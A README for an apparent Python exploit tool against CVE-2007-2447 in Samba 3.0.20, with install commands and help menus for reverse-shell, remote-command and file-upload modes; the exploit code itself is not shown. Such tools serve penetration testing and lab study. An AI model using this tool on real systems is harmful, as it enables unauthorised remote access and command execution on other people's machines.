# CVE-2007-2447: Samba 3.0.20 Exploit

https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2007-2447

## Installation

Clone this repository or download the `exploit.py` directly.

`git clone https://github.com/Bode-Raymond/Custom-Tools/`

`wget https://raw.githubusercontent.com/Bode-Raymond/Custom-Tools/main/Samba%203.0.20%20Exploit%20Script/exploit.py`

Install the required python modules

`pip install -r requirements.txt`

Run the script using python 3

`python3 exploit.py`

## Available Modes

- shell - Start a reverse shell on the target
- rce - Execute commands on the target
- upload - Upload a file to a specified location on the target

## Help Menus

### Default Help

```
Usage: python3 exploit.py <option> <arguments>

Options:
shell	Start a reverse shell
rce	Execute commands on the target
upload	upload file to target from webserver
```

### `Shell` Mode Help

```
python3 exploit.py shell <lhost> <lport> <rhost> <rport>

lhost	Local host IP
lport	Local host listening port
rhost	Remote host IP
rport	Remote host SMB port
```

### `RCE` Mode Help

```
python3 exploit.py rce <command> <rhost> <rport>

command	shell command to be executed, no output
rhost	Remote host IP
rport	Remote host SMB port
```

### `Upload` Mode Help

```
url		location of target file (use public ip)
target-location	Target file on the target computer
rhost		Remote host IP
rport		Remote host SMB port
```
